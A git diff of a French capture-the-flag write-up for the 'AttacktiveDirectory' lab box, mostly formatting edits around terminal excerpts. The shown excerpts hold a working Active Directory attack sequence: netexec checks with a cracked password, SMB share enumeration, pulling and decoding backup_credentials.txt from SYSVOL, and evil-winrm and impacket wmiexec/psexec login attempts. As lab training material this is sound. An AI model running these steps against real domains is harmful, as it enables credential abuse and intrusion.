@@ -15,7 +15,7 @@ Hi, aujourd'hui je vais partager mes notes avec la Box `AttacktiveDirectory` sur
 
 
 ## Reconnaissance
-Comme tout autre machine, je vais commencer par scanner la Box avec `nmap` et ce petit outil que j'ai automatiser.
+Comme tout autre machine, je vais commencer par scanner la Box avec `nmap` et ce petit outil automatiser disponible ici : [nmapauto](https://github.com/nenandjabhata/CTFs-Journey/blob/main/Scripts/nmapauto.sh).
 
 ```terminal
 └─# /home/blo/tools/nmapautomate/nmapauto.sh 10.10.222.17 
@@ -279,23 +279,28 @@ Hardware.Mon.#1..: Temp: 40c Util: 63%
 Avec `hashcat` je crack le hash et le mot de passe `management2005`
 
 ## Acces Initial
+
 J'ai un utilisateur et un mot de passe, so maintenant quoi faire ?
-- D'abord faire du `Netexec` pour voir s'ils sont valides
+- D'abord faire du `Netexec` pour voir s'ils sont valides.
+
 ```terminal
 └─# nxc smb $ip -u svc-admin -p 'management2005'
 SMB         10.10.237.76    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
 SMB         10.10.237.76    445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
 
 ```
-Ok l'utilisateur est bien valide,
 
+Ok l'utilisateur est bien valide,
 - je vais enumerer le port 5985 basee sur `winrm` et voir si je peux me connecer
+
 ```terminal
 ─# nc -nv $ip 5985                             
 (UNKNOWN) [10.10.237.76] 5985 (?) open
 
 ```
+
 Le port est ouvert, alors je vais essayer de me connecter la dessus avec `evil-winrm`
+
 
 ```terminal
 └─# evil-winrm -i $ip -u svc-admin -p management2005
@@ -314,6 +319,8 @@ Error: Exiting with code 1
 ```
 J'arrive pas a me connecter, Donc quoi faire encore ?
 - Je vais enumerer les `shares` avec cet utilisateur
+
+
 ```terminal
 └─# nxc smb $ip -u svc-admin -p 'management2005' --shares
 SMB         10.10.237.76    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
@@ -330,6 +337,7 @@ SMB         10.10.237.76    445    ATTACKTIVEDIREC  SYSVOL          READ        
 ```
 
 Plein de `shares` disponible et j'ai des droit de `READ` dans plein d'entre eux. et ici d'apres Google, l'un des plus importants `shares` ici est le `SYSVOL`. Donc essayons voir
+
 
 ```terminal
 ─# impacket-smbclient spookysec.local/svc-admin:management2005@10.10.237.76
@@ -358,6 +366,7 @@ drw-rw-rw-          0  Sat Apr  4 13:39:35 2020 scripts
 ```
 
 Pour telecharger les fichiers en local
+
 ```terminal
 ─# smbclient \\\\10.10.237.76/SYSVOL -U svc-admin
 Password for [WORKGROUP\svc-admin]:
@@ -390,12 +399,16 @@ getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 K
 smb: \> 
 ```
 Je telecharge le fichier et a l'interieur je troue un `base64` que je peux decoder dans mon terminal
+
+
 ```terminal
 ─# cat backup_credentials.txt | base64 -d
 backup@spookysec.local:backup2517860 
 ```
 Un autre utilisateur et un mot de passe, 
 - Verification avec `Netexec`
+
+
 ```terminal
 └─# nxc smb $ip -u backup -p 'backup2517860' --shares
 SMB         10.10.237.76    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
@@ -413,6 +426,8 @@ SMB         10.10.237.76    445    ATTACKTIVEDIREC  SYSVOL          READ        
 ```
 
 - Je vais essayer `wmiexec`  pour cet utilisateur.
+
+
 ```terminal
 └─# impacket-wmiexec spookysec.local/backup:backup2517860@10.10.237.76
 Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
@@ -422,6 +437,7 @@ Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
 ```
 
 Encore `psexec`
+
 ```terminal
 └─# impacket-psexec spookysec.local/backup:backup2517860@10.10.237.76
 Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra
